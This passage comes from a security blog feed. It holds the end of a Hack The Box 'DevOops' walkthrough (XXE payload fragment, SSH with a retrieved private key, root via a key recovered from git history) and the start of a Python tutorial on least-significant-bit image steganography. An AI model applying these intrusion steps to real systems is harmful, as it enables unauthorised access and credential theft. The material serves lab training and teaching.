    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;BoiteAKlou&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;Payload&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Book&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the private key retrieved, we can connect via ssh and enjoy the user flag:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;boiteaklou@kali:/DevOops&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa roosa@10.10.10.91
Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.13.0-37-generic i686&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Thu Oct 11 17:27:36 2018 from 10.10.12.226
roosa@gitter:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
c5808e[..]ecc67b
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now things are getting serious…&lt;/p&gt;

&lt;h2 id=&quot;getting-root&quot;&gt;Getting root&lt;/h2&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Every privilege escalation requires an exhaustive enumeration of the system. This is quite a long process which can be facilitated by scripts such as &lt;a href=&quot;https://github.com/rebootuser/LinEnum&quot;&gt;LinEnum&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I won’t detail here my whole process of enumerating, only the relevant part in our case.&lt;/p&gt;

&lt;p&gt;The TODO note we found when consulting the website suggested that this project was versioned. In that case, it could be interesting to retrieve the content of a &lt;strong&gt;git&lt;/strong&gt; or &lt;strong&gt;svn&lt;/strong&gt; folder.&lt;/p&gt;

&lt;p&gt;You can use the following command to look for any &lt;strong&gt;.git&lt;/strong&gt; directory:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; d &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; .git 2&amp;gt;/dev/null
./work/blogfeed/.git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great we found one! Let’s see what we can learn from it…&lt;/p&gt;
&lt;h3 id=&quot;sensitive-git-repository&quot;&gt;Sensitive git repository&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git log&lt;/code&gt; shows us every commit message from this repository and the two commits below caught my attention:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson &amp;lt;roosa@solita.fi&amp;gt;
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson &amp;lt;roosa@solita.fi&amp;gt;
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I immediately jumped back to the commit where the key was accidentaly added, thanks to this command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout d387abf63e05c9628a59195cec9311751bdb283f
error: Your &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;changes to the following files would be overwritten by checkout:
	run-gunicorn.sh
Please, commit your changes or stash them before you can switch branches.
Aborting
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Crap! We have unstaged changes. No problem, we can tell git to ignore these changes with &lt;code class=&quot;highlighter-rouge&quot;&gt;git checkout -- run-gunicorn.sh&lt;/code&gt; and then re-execute it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout d387abf63e05c9628a59195cec9311751bdb283f
Note: checking out &lt;span class=&quot;s1&quot;&gt;'d387abf63e05c9628a59195cec9311751bdb283f'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

You are &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'detached HEAD'&lt;/span&gt; state. You can look around, make experimental
changes and commit them, and you can discard any commits you make &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this
state without impacting any branches by performing another checkout.

If you want to create a new branch to retain commits you create, you may
&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;so &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;now or later&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; by using &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; with the checkout &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;again. Example:

  git checkout &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &amp;lt;new-branch-name&amp;gt;

HEAD is now at d387abf... add key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;feed integration from tnerprise backend
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Better! The file &lt;strong&gt;authcredentials.key&lt;/strong&gt; has appeared inside resources/integration/.
Let’s try to login as root using this key:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; resources/integration/authcredentials.key root@localhost
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'resources/integration/authcredentials.key'&lt;/span&gt; are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key &lt;span class=&quot;s2&quot;&gt;&quot;resources/integration/authcredentials.key&quot;&lt;/span&gt;: bad permissions
root@localhost&lt;span class=&quot;s1&quot;&gt;'s password:
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;SSH refuses to use this key because permissions are too open. We can fix this with &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 0600 resources/integration/authcredentials.key&lt;/code&gt; and try to connect again.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; resources/integration/authcredentials.key root@localhost
Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.13.0-37-generic i686&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
 &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Fri Oct 12 04:48:17 2018 from 10.10.13.23
root@gitter:~#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Bingo! Enjoy the flag :wink:&lt;/p&gt;

&lt;p id=&quot;signature&quot;&gt;BoiteAKlou :hammer:&lt;/p&gt;</content><author><name>BoiteAKlou</name></author><summary type="html">Hack The Box is an online platform that allows you to test your pentesting skills on virtual machines intentionally left vulnerable. It is a great place to learn and the community is very helpful so I warmly recommend you to check this site out. In this article, I’ll detail every step I’ve gone through in order to root the DevOops box, from the reconnaissance phase to the privilege escalation.</summary></entry><entry><title type="html">Steganography Tutorial: Least Significant Bit (LSB)</title><link href="http://localhost:4000/Steganography-Least-Significant-Bit.html" rel="alternate" type="text/html" title="Steganography Tutorial: Least Significant Bit (LSB)" /><published>2018-08-12T18:00:00+02:00</published><updated>2018-08-12T18:00:00+02:00</updated><id>http://localhost:4000/Steganography-Least-Significant-Bit</id><content type="html" xml:base="http://localhost:4000/Steganography-Least-Significant-Bit.html">&lt;p&gt;This article details a common steganography method known as the Least Significant Bit. This technique is very efficient because of its &lt;strong&gt;simplicity&lt;/strong&gt; and its ability to be &lt;strong&gt;undetectable to the naked eye&lt;/strong&gt;. After reading this, you’ll be able to hide a message inside a picture using this technique, but also to detect any dissimulated message.&lt;/p&gt;

&lt;p&gt;&lt;!--excerpt--&gt;&lt;/p&gt;

&lt;h1 class=&quot;no_toc&quot; id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#do-it-yourself&quot; id=&quot;markdown-toc-do-it-yourself&quot;&gt;Do It Yourself!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#technical-description&quot; id=&quot;markdown-toc-technical-description&quot;&gt;Technical description&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#digital-image-structure&quot; id=&quot;markdown-toc-digital-image-structure&quot;&gt;Digital image structure&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#lsb-principle&quot; id=&quot;markdown-toc-lsb-principle&quot;&gt;LSB Principle&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#am-i-not-significant-to-you&quot; id=&quot;markdown-toc-am-i-not-significant-to-you&quot;&gt;Am I not significant to you?&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#why-do-we-modify-this-very-specific-bit&quot; id=&quot;markdown-toc-why-do-we-modify-this-very-specific-bit&quot;&gt;Why do we modify this very specific bit?&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#how-to-hide-a-message&quot; id=&quot;markdown-toc-how-to-hide-a-message&quot;&gt;How to hide a message?&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#encoding-and-transforming-a-string-into-a-sequence-of-bits&quot; id=&quot;markdown-toc-encoding-and-transforming-a-string-into-a-sequence-of-bits&quot;&gt;Encoding and transforming a string into a sequence of bits&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#messing-with-pixels&quot; id=&quot;markdown-toc-messing-with-pixels&quot;&gt;Messing with pixels&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#detection&quot; id=&quot;markdown-toc-detection&quot;&gt;Detection&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#all-about-contrast&quot; id=&quot;markdown-toc-all-about-contrast&quot;&gt;All about contrast&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#extraction&quot; id=&quot;markdown-toc-extraction&quot;&gt;Extraction&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#python-my-love&quot; id=&quot;markdown-toc-python-my-love&quot;&gt;Python my love&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#your-turn&quot; id=&quot;markdown-toc-your-turn&quot;&gt;Your Turn!&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#resources&quot; id=&quot;markdown-toc-resources&quot;&gt;Resources&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;do-it-yourself&quot;&gt;Do It Yourself!&lt;/h2&gt;

&lt;p&gt;If you’re already familiar with the concept of LSB and simply want to practice, download &lt;a href=&quot;http://localhost:4000/assets/2018-08-12/lsb_spongebob.png&quot;&gt;this picture&lt;/a&gt; and feel free to send me your result or to post it in the comment section.&lt;/p&gt;

&lt;h2 id=&quot;technical-description&quot;&gt;Technical description&lt;/h2&gt;

&lt;h3 id=&quot;digital-image-structure&quot;&gt;Digital image structure&lt;/h3&gt;

&lt;p&gt;To understand this technique, a few reminders of some digital imaging basics might be useful.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A digital image is composed of \(X\) rows by \(Y\) columns.&lt;/li&gt;
  &lt;li&gt;The point of coordinates \([a,b]\) with \(0\leqslant a&amp;lt;X\) and \(0\leqslant b&amp;lt;Y\), is called a &lt;strong&gt;pixel&lt;/strong&gt;. The &lt;strong&gt;pixel&lt;/strong&gt; represents the smallest addressable element of a picture.&lt;/li&gt;
  &lt;li&gt;Each pixel is associated with a color, usually decomposed in three primary colors: &lt;strong&gt;Red, Green, Blue&lt;/strong&gt;. A pixel can then be specified as &lt;strong&gt;pixel(Red, Green, Blue)&lt;/strong&gt;, that’s what we call the &lt;em&gt;RGB model&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;Red, Green and Blue intensities can vary from 0 to 255.&lt;/li&gt;
  &lt;li&gt;WHITE = (255,255,255) and BLACK = (0,0,0).&lt;/li&gt;
  &lt;li&gt;A pixel take 3 bytes of memory, 1 for each primary component (hence the maximum value of 255).&lt;/li&gt;
  &lt;li&gt;A byte consists of 8 bits, representing a binary number (example: 1010 0101).&lt;/li&gt;
  &lt;li&gt;The highest value a byte can take is 1111 1111, which is equal to 255 in decimal.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;lsb-principle&quot;&gt;LSB Principle&lt;/h3&gt;

&lt;p&gt;Now that you have the structure of a digital image in mind, we can start talking about the serious stuff :wink:.&lt;/p&gt;

&lt;p&gt;As its name suggests, the Least Significant Bit technique is based on hiding information in the least significant bit of each byte of the picture. There are multiple variants of LSB but, in this article, we will set the focus on the most common one.&lt;/p&gt;

&lt;h4 id=&quot;am-i-not-significant-to-you&quot;&gt;Am I not significant to you?&lt;/h4&gt;

&lt;p&gt;The notion of “Least Significant Bit” probably doesn’t speak to everyone so I’ll explain it.
Let’s take the following representation of a byte, where the weight is annotated below each bit:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/byte_diagram.jpg&quot; alt=&quot;Bit weights&quot; title=&quot;Bit weights diagram&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first bit on the left is the “heaviest” one since it’s the one that has the biggest influence on the value of the byte. Its weight is 128.&lt;/p&gt;

&lt;p&gt;Now look at the bit on the very right. Its weight is 1 and it has a very minor impact on the value of the byte.
In a way, this bit is the &lt;strong&gt;least significant bit&lt;/strong&gt; of this byte.&lt;/p&gt;

&lt;h4 id=&quot;why-do-we-modify-this-very-specific-bit&quot;&gt;Why do we modify this very specific bit?&lt;/h4&gt;

&lt;p&gt;Well, simply because it’s the least significant one. Let me explain:&lt;/p&gt;

&lt;p&gt;The following diagram illustrates the color difference when the least significant bit of the red channel is modified.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/significant_bit_diff.jpg&quot; alt=&quot;Significant bit modification&quot; title=&quot;Significant bit modification&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Can you spot the difference? No? Me neither and that’s exactly the goal! That way, we can modify &lt;strong&gt;3 bits per pixel&lt;/strong&gt; without it is noticeable.&lt;/p&gt;

&lt;h3 id=&quot;how-to-hide-a-message&quot;&gt;How to hide a message?&lt;/h3&gt;

&lt;p&gt;Ok the theory should be clear now, but we’ve seen that we can only hide 3 bits per pixel and we want to dissimulate a full message! How are we supposed to do?&lt;/p&gt;

&lt;p&gt;Easy! A message is actually a sequence of bits so it’s not an issue. The only limitation is that the size of the message in bits must be inferior to the number of pixels in the picture multiplied by 3.&lt;/p&gt;

&lt;p&gt;There are plenty of tools already available for hiding a message inside a picture with the LSB technique but &lt;strong&gt;I encourage you to write your own tool&lt;/strong&gt;. This will help you getting familiar with a scripting language and will require from you a prefect understanding of the concept.&lt;/p&gt;

&lt;p&gt;For the needs, of this tutorial I used Python 2.7. Sources of the scripts used in this article will be downloadable at the bottom of the page.&lt;/p&gt;

&lt;p&gt;Alright, let’s dive into the code! :+1:&lt;/p&gt;

&lt;h4 id=&quot;encoding-and-transforming-a-string-into-a-sequence-of-bits&quot;&gt;Encoding and transforming a string into a sequence of bits&lt;/h4&gt;

&lt;p&gt;In order to avoid data losses caused by encoding problems, &lt;strong&gt;the initial message must be base64-encoded&lt;/strong&gt;.
There are many ways to turn a string into its binary representation in python, but I decided to use the &lt;a href=&quot;https://pypi.org/project/bitarray/&quot;&gt;bitarray module&lt;/a&gt;. If you don’t have it installed, just type &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo pip install bitarray&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;bitarray&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'YourVerySecretText'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;encoded_message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#Converts the message into an array of bits&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitarray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bitarray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;frombytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encoded_message&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bit_array&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;bit_array&lt;/strong&gt; now contains the binary representation of our message.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE: Make sure to hide your message inside a PNG file and not a JPEG or its lossy compression algorithm will overwrite your modifications!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;messing-with-pixels&quot;&gt;Messing with pixels&lt;/h4&gt;

&lt;p&gt;Let’s say we want to hide our message inside this picture (download with &lt;strong&gt;Right click &amp;gt; Save Image as…&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2018-08-12/spongebob.png&quot; alt=&quot;Confused Spongebob&quot; title=&quot;Confused Spongebob&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s a wonderful python library for manipulating images called &lt;a href=&quot;https://pillow.readthedocs.io/en/5.2.x/&quot;&gt;PIL&lt;/a&gt; (pillow since python3).&lt;/p&gt;

&lt;p&gt;First, let’s duplicate the original picture. We will only modify the one called “lsb_spongebob.png”.
Then, we store the image size for later.
The &lt;strong&gt;load()&lt;/strong&gt; function retrieves an array containing every pixel in RGB format.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lsb_spongebob.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;height&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s say we want to hide our message at the beginning of the &lt;strong&gt;first row of the picture&lt;/strong&gt;, I’ve written the following piece of code which is kinda ulgy, I agree, but that makes the job, you know :wink:.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Pixel : [&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d,&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d]&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
